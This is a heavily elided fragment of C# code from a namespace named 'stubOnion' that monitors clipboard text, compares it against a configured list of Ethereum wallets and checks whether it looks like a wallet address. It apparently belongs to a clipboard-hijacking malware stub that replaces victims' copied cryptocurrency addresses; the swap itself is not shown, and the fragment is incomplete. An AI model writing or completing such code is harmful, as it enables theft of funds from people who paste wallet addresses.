...
namespace stubOnion
{
        ...
        public static void GetEtheriumWhile()
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    ...
                    if (!Config.walletseth.Contains(clpbrd))
                    {
                        if (CheckEth.Clipregex(clpbrd))
                        {   
    ...
    class CheckEth
    {
        ...
        public static bool Clipregex(string clipboard)
        {
            ...
            if (date.Length < 40 || date.Length > 60) return false;
